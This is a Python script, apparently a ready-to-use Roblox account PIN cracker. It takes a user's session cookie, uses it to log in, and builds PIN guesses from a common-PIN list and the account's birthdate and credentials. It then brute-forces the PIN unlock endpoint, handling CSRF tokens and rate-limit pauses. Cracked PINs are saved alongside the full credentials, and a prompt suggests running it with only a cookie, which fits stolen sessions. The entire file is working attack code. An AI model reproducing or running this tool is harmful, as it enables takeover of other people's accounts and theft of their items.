import time
import ctypes
import requests
from threading import Thread

account = input(
    'Enter your user:pass:cookie.\n'
    'No user:pass? Just do something like random:poop:<cookie>\n'
    '--> '
)

try: username, password, cookie = account.split(':',2)
except:
    input('INVALID FORMAT >:(')
    exit()

req = requests.Session()
req.cookies['_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhAB.E0FC1E7D768A837ECC665FACCB2EEA711B802CE337E985D58434A9EABD6FAC13FFDBB53FB803F5D108C24D5C1064F9CA14688B644AD6856E932E5C5325E7D10B2084405B34812B4A4E05F3B627CEABFA690291E22F6F865BD001B60F629D5BBCFA069344ED2432FDE23F31C58A4FBD390B2340687636362EED5750FF1083AAC9AB635B99D2A123A7A5CE1FBE2BED1A36601E4B2A74516ED4B7C881A59E56BC0F9C4B6722DB4DDAA5AF0049A6BE8F8BDFC769E42A2A5BEED1D17E120FC30811085542E1188D8C287A6A791644F40F1C89B598AEC74C2B803A38092D24B13D35334A504E850684BD460DBAB2C8F9B5A65C3A7A23109E242F9FE902F409A63A9F1C4CAE5D8C3D272B600000DAA29ADA0D2547BC8E262A87B475B6D0982E15C54E655C3CB946C18CA34514E9DBC0994AAB4F9CD1CBB50E0BFAFBE7EA15CDE546DAFF326F6DE73A397260C1CD7D416AAE11DB459125CE221DA093915505754630CA6BB030A10375B9A32F4AB7BF15F9F58C3F933D58493074E7A53BF5A2E9921C431A3FDD66CDACCFBA628A88EE1328F913462A2B198449E54B7C69706CD11AEDB1846BBAE1233B97DF1A99095A69F10E990D4E33FE7BE0D21659F724CCA0EE5CA834B4BF2FEB4983401A7314088C279A7E9C02A5070C63CE6C0BC83811122815A4884C0F4516ABB45E3442A555A2E29556E90A60785189CCEB7E22885E3ABE4436089AE7802790E7CC494117489C759F86ED407F054BC661C013731817956B2E88DDDA754F13C83982B2ABE4C8280724494159CD41B6BDACE2893BA13E1AF1538005A9896E1F9ED41A75DA2ABF22D45304369BF9682EB23AA9808D60FC28F149EBAF9E016E78B9DFFEA9BF245BD179C6B23CA224D6FD6894277ADC64A061629C29FE046340E2EA172C3E2EC8934166D1958BDF8AAD7A0DC8A7A5826AA73CC6A9F071BCC80B0F23747F09996678BC5702C2F4077C4E9672488CEE0D718667D5BF3A42839175381A64C245B9E234F763C7AFC40A6AD42AFF5E322662AB45A6AC2042DE18667B9DDC77F3C84C55994BDDD03207F37B7C3B401E73CEA99D855A8E5898BC9A59EBACE77E956F8270B44D5D79E572846787539F247C76269E3C142B29136650367CEB02774BA0FD4B778EEAFD7AABE3B9B31C8817D8EC89C0106FCA26E6E59CF4E5D671C5E0872B1F7C4C006630789EC0E289AF67CBFAE0686C0577905AEF37F9FD85'] = cookie
try:
    r = req.get('https://www.roblox.com/mobileapi/userinfo').json()
    userid = r['UserID']
except:
    input('INVALID COOKIE')
    exit()

print('Logged in.\n')


r = requests.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv').text
pins = [x.split(',')[0] for x in r.splitlines()]
print('Loaded most common pins.')

r = req.get('https://accountinformation.roblox.com/v1/birthdate').json()
month = str(r['birthMonth']).zfill(2)
day = str(r['birthDay']).zfill(2)
year = str(r['birthYear'])

likely = [username[:4], password[:4], username[:2]*2, password[:2]*2, username[-4:], password[-4:], username[-2:]*2, password[-2:]*2, year, day+day, month+month, month+day, day+month]
likely = [x for x in likely if x.isdigit() and len(x) == 4]
for pin in likely:
    pins.remove(pin)
    pins.insert(0, pin)

print(f'Prioritized likely pins {likely}\n')

sleep = 0
tried = 0

while 1:
    pin = pins.pop(0)
    ctypes.windll.kernel32.SetConsoleTitleW(f'PIN CRACKER | Tried: {tried}/9999 | Current pin: {pin}')
    try:
        r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})
        if 'X-CSRF-TOKEN' in r.headers:
            pins.insert(0, pin)
            req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        elif 'errors' in r.json():
            code = r.json()['errors'][0]['code']
            if code == 0 and r.json()['errors'][0]['message'] == 'Authorization has been denied for this request.':
                print(f'[FAILURE] Account cookie expired.')
                break
            elif code == 1:
                print(f'[SUCCESS] NO PIN')
                with open('cracked.txt','a') as f:
                    f.write(f'NO PIN:{account}\n')
                break
            elif code == 3:
                pins.insert(0, pin)
                sleep += 1
                if sleep == 5:
                    sleep = 0
                    time.sleep(300)
            elif code == 4:
                tried += 1
        elif 'unlockedUntil' in r.json():
            print(f'[SUCCESS] {pin}')
            with open('cracked.txt','a') as f:
                f.write(f'{pin}:{account}\n')
            break
        else:
            print(f'[ERROR] {r.text}')
            pins.append(pin)
    except Exception as e:
        print(f'[ERROR] {e}')
        pins.append(pin)

input()
